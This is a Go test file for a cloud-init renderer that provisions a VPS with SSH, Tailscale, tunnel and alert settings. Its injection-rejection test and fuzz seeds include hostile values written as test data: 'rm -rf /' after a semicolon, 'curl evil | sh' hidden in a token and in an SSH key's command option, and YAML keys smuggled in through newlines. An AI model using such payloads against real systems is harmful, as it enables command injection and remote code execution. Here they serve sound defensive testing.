package cloudinit

import (
	"flag"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"go.yaml.in/yaml/v3"

	"github.com/tulayha/closedvps/internal/alert"
)

var update = flag.Bool("update", false, "rewrite the golden files in testdata")

const key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK3p23RMzU7qduY/lH9cE1rnbYIsm4BHn7aXTe0mfbc1 me@laptop"

func base() Config {
	return Config{Version: "test", Name: "vps", User: "dev", SSHPublicKey: key, TailscaleKey: "tskey-auth-abc123-XYZ"}
}

func TestRenderMinimal(t *testing.T) {
	doc, err := Render(base())
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"#cloud-config\n", `hostname: "vps"`, `- name: "dev"`, `"` + key + `"`, "AllowUsers dev",
		"PasswordAuthentication no", "Automatic-Reboot \"true\"", `{ "ip": "127.0.0.1" }`,
		"tailscale up --auth-key=file:/var/lib/closedvps/tailscale-key --hostname=vps",
		`content: "tskey-auth-abc123-XYZ"`,
		"- nftables", "ip daddr 169.254.169.254 meta skuid != 0 drop", "enable --now closedvps-metadata.service",
	} {
		if !strings.Contains(doc, want) {
			t.Errorf("missing %q", want)
		}
	}
	for _, unwanted := range []string{"cloudflared", "claude.ai/install.sh", "bubblewrap"} {
		if strings.Contains(doc, unwanted) {
			t.Errorf("%q present without being asked for", unwanted)
		}
	}
}

func TestRenderExtras(t *testing.T) {
	c := base()
	c.TunnelToken = "eyJhIjoiYiJ9"
	c.Claude = true
	doc, err := Render(c)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"tunnel run --token-file", "claude.ai/install.sh", "bubblewrap", "/etc/apparmor.d/bwrap"} {
		if !strings.Contains(doc, want) {
			t.Errorf("missing %q", want)
		}
	}
	red := Redact(doc, c)
	if strings.Contains(red, c.TailscaleKey) || strings.Contains(red, c.TunnelToken) {
		t.Error("secrets left in redacted output")
	}
}

func TestRenderQuotesYAMLWords(t *testing.T) {
	c := base()
	c.User, c.Name = "yes", "123"
	doc, err := Render(c)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(doc, `hostname: "123"`) || !strings.Contains(doc, `- name: "yes"`) {
		t.Error("names that YAML reads as numbers or booleans must be quoted")
	}
}

func TestValidateRejectsInjection(t *testing.T) {
	bad := []func(*Config){
		func(c *Config) { c.Name = "vps\nruncmd: [reboot]" },
		func(c *Config) { c.User = "root" },
		func(c *Config) { c.User = "dev; rm -rf /" },
		func(c *Config) { c.TailscaleKey = "tskey-a\n- evil" },
		func(c *Config) { c.TailscaleKey = "not-a-key" },
		func(c *Config) { c.TunnelToken = "tok' ; curl evil | sh '" },
		func(c *Config) { c.SSHPublicKey = key + "\nssh-rsa AAAA other" },
		func(c *Config) { c.SSHPublicKey = "-----BEGIN OPENSSH PRIVATE KEY-----" },
		func(c *Config) { c.SSHPublicKey = `command="curl evil|sh" ` + key },
		func(c *Config) { c.SSHPublicKey = "ssh-ed25519 notbase64 me" },
	}
	for i, mod := range bad {
		c := base()
		mod(&c)
		if _, err := Render(c); err == nil {
			t.Errorf("case %d accepted", i)
		}
	}
}

func TestRenderReadyAlerts(t *testing.T) {
	c := base()
	c.Ready = []alert.Request{{URL: "https://discord.com/api/webhooks/1/secret", Header: map[string]string{"Content-Type": "application/json"}, Body: `{"content":"vps is ready"}`}}
	doc, err := Render(c)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"/var/lib/closedvps/ready-0.curl", `-K \"$$f\"`, "rm -f /var/lib/closedvps/ready-*.curl", "webhooks/1/secret"} {
		if !strings.Contains(doc, strings.ReplaceAll(want, `\"`, `"`)) {
			t.Errorf("missing %q", want)
		}
	}
	if red := Redact(doc, c); strings.Contains(red, "secret") {
		t.Error("alert link left in redacted output")
	}
	for _, r := range []alert.Request{{URL: "http://example.com/x"}, {URL: "https://example.com/x\nruncmd: [reboot]"}, {URL: "https://example.com/x", Header: map[string]string{"Title": "a\nb"}}} {
		c.Ready = []alert.Request{r}
		if _, err := Render(c); err == nil {
			t.Errorf("accepted %+v", r)
		}
	}
}

// Redact must hide every alert file, whatever its headers, or a dry run prints the link.
func TestRedactSeveralHeaders(t *testing.T) {
	c := base()
	c.Ready = []alert.Request{{
		URL:    "https://hooks.example.com/s3cret",
		Header: map[string]string{"Content-Type": "application/json", "Title": "vps", "Priority": "high"},
		Body:   `{"text":"s3cret body"}`,
	}}
	doc, err := Render(c)
	if err != nil {
		t.Fatal(err)
	}
	if red := Redact(doc, c); strings.Contains(red, "s3cret") || !strings.Contains(red, "<hidden: alert link and message>") {
		t.Fatalf("not hidden:\n%s", red)
	}
}

// The golden files are the whole first-boot setup, so a change to it shows up in review as a diff.
// go test ./internal/cloudinit -update rewrites them.
func TestRenderGolden(t *testing.T) {
	full := base()
	full.TunnelToken, full.Claude = "eyJhIjoiYiJ9", true
	full.Ready = []alert.Request{{URL: "https://ntfy.sh/closedvps-abc", Header: map[string]string{"Title": "vps is ready"}, Body: "ssh dev@vps"}}
	for name, c := range map[string]Config{"minimal": base(), "full": full} {
		doc, err := Render(c)
		if err != nil {
			t.Fatal(err)
		}
		path := filepath.Join("testdata", name+".yaml")
		if *update {
			if err := os.WriteFile(path, []byte(doc), 0o600); err != nil {
				t.Fatal(err)
			}
			continue
		}
		want, err := os.ReadFile(path)
		if err != nil {
			t.Fatal(err)
		}
		if doc != string(want) {
			t.Errorf("%s differs from %s; if that's intended, run go test ./internal/cloudinit -update and review the diff", name, path)
		}
	}
}

// Whatever a user types, a setup that renders is one YAML document with only closedvps's own keys, and each
// value lands where it belongs.
func FuzzRender(f *testing.F) {
	f.Add("vps", "dev", "me@laptop", "tskey-auth-abc", "", "https://ntfy.sh/x", "Title", "body")
	f.Add("123", "yes", "a: b", "tskey-x", "tok", "https://e.com/a\nb", "X", "\"; rm -rf /")
	f.Fuzz(func(t *testing.T, name, user, comment, tsKey, tunnel, url, hk, body string) {
		c := Config{
			Version: "test", Name: name, User: user, SSHPublicKey: strings.TrimSpace(key[:strings.LastIndex(key, " ")] + " " + comment),
			TailscaleKey: tsKey, TunnelToken: tunnel,
			Ready: []alert.Request{{URL: url, Header: map[string]string{hk: "v"}, Body: body}},
		}
		doc, err := Render(c)
		if err != nil {
			return
		}
		var got map[string]any
		if err := yaml.Unmarshal([]byte(doc), &got); err != nil {
			t.Fatalf("not YAML: %v", err)
		}
		var keys []string
		for k := range got {
			keys = append(keys, k)
		}
		slices.Sort(keys)
		want := []string{"disable_root", "hostname", "package_update", "package_upgrade", "packages", "power_state", "runcmd", "ssh_pwauth", "users", "write_files"}
		if !slices.Equal(keys, want) {
			t.Fatalf("top-level keys %v", keys)
		}
		if got["hostname"] != name {
			t.Fatalf("hostname %v, want %q", got["hostname"], name)
		}
		u := got["users"].([]any)[0].(map[string]any)
		if u["name"] != user || u["ssh_authorized_keys"].([]any)[0] != c.SSHPublicKey || len(got["users"].([]any)) != 1 {
			t.Fatalf("user %v", u)
		}
		if !strings.Contains(doc, `- path: /var/lib/closedvps/ready-0.curl`) {
			t.Fatal("ready alert missing")
		}
		for _, f := range got["write_files"].([]any) {
			if p := f.(map[string]any)["path"].(string); p == "/var/lib/closedvps/ready-0.curl" && f.(map[string]any)["content"] != c.Ready[0].CurlConfig() {
				t.Fatalf("alert file content changed on the way:\n%v", f.(map[string]any)["content"])
			}
		}
	})
}
